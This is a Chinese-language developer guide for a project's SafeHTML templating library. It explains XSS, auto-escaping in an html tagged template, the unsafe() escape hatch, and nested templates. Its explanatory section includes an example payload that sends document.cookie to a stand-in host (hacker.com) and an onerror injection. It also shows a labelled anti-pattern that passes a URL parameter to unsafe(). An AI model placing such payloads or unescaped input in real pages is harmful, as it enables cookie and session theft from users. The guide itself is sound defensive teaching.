# 🛡️ 模板渲染與 XSS 防護 (SafeHTML)

在原生 Web 中，動態修改網頁內容通常會使用 `element.innerHTML = markup`。然而，這是一個潛在的安全性漏洞來源：如果 `markup` 中包含了使用者輸入的惡意代碼，便會觸發 **XSS (跨站腳本攻擊)**。

本專案實作了一套預設防禦的 **SafeHTML 渲染機制 (`lib/html.js`)**，為原生 JavaScript 帶來了如同 Lit 或 React 般的安全保障。

---

## ☣️ 1. 什麼是 XSS 漏洞？

當應用直接將未過濾的使用者輸入作為 HTML 渲染時，駭客可以注入以下惡意代碼：

```html
<!-- 惡意輸入範例 A：直接執行腳本 -->
<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>

<!-- 惡意輸入範例 B：隱蔽的屬性型注入 -->
<img src="invalid-image.jpg" onerror="sendSensitiveDataToHacker()">
```

如果您的代碼是這樣寫的：
```javascript
// ❌ 嚴重漏洞：userInput 內含惡意腳本時，會被直接執行
container.innerHTML = `<div>${userInput}</div>`;
```
駭客將能輕易竊取使用者 Cookie、Session 憑證，或劫持網頁內容。

---

## 🛡️ 2. `html` 標籤模板的自動安全轉義 (Auto Escaping)

為了解決此痛點，本專案所有繼承自 `BaseComponent` 的組件皆強制要求在 `render()` 中返回使用 `html\`...\`` 標籤模板包裝的內容。

### 2.1 自動轉義機制
`html` 模板會掃描所有 `${}` 插值，並自動使用 `escapeHTML` 把 HTML 敏感字元替換成安全實體：
* `&` ➜ `&amp;`
* `<` ➜ `&lt;`
* `>` ➜ `&gt;`
* `"` ➜ `&quot;`
* `'` ➜ `&#039;`

### 2.2 代碼演示
```javascript
import { html } from '../../lib/html.js';

render() {
    const userInput = "<script>alert('hack')</script>";
    
    // 🛡️ 系統會自動轉義為: &lt;script&gt;alert(&#039;hack&#039;)&lt;/script&gt;
    // 瀏覽器只會將其顯示為純文字，而不會將其作為代碼執行！
    return html`
        <div class="comment">
            <p>用戶留言：${userInput}</p>
        </div>
    `;
}
```

---

## ⚠️ 3. 什麼是 `unsafe`？如何安全使用？

有些情境下，我們**必須**將純字串渲染成真實的 HTML（例如：將 Markdown 轉換出來的 HTML 渲染到文檔中心）。
如果直接放在 `html` 模板中，畫面會直接顯示 HTML 原始碼。這時，我們需要使用 `unsafe` 來強制標記該字串為受信任的安全內容：

```javascript
import { html, unsafe } from '../../lib/html.js';

render() {
    const markdownHtml = "<h1>文檔標題</h1><p>內文...</p>";
    
    // ✅ 使用 unsafe 告訴渲染引擎：「此字串是安全的，請直接解析為 DOM」
    return html`
        <article class="article-content">
            ${unsafe(markdownHtml)}
        </article>
    `;
}
```

### 🚫 `unsafe` 的致命錯誤用法 (Anti-Pattern)
**千萬不要將含有使用者直接輸入、網址參數 (Query String) 或外部未經過濾 API 回傳的欄位傳給 `unsafe`：**

```javascript
// ❌ 致命漏洞！這會完全繞過 XSS 防護，重新將系統暴露在危險之中
const query = new URLSearchParams(window.location.search);
const userName = query.get('name'); // 駭客可傳入惡意代碼
return html`
    <div>歡迎, ${unsafe(userName)}</div> 
`;
```

---

## 🔄 4. 巢狀 SafeHTML 的自動傳遞

`html` 標籤模板內建遞迴識別。如果 `${}` 中的內容本身就是另一個由 `html\`...\`` 產生的 `SafeHTML` 物件，或是該物件組成的陣列，系統會自動將其識別為安全節點進行巢狀渲染，而不會對其進行二次轉義：

```javascript
render() {
    // 巢狀安全組件
    const header = html`<header>網站標題</header>`;
    
    // 安全的項目陣列
    const listItems = ['選項一', '選項二'].map(item => html`<li>${item}</li>`);
    
    return html`
        <div class="layout">
            ${header}
            <ul>${listItems}</ul>
        </div>
    `;
}
```
此機制可讓您放心地將 UI 模板進行模組化拆分與傳遞，兼顧「極致的開發體驗」與「預設安全」。
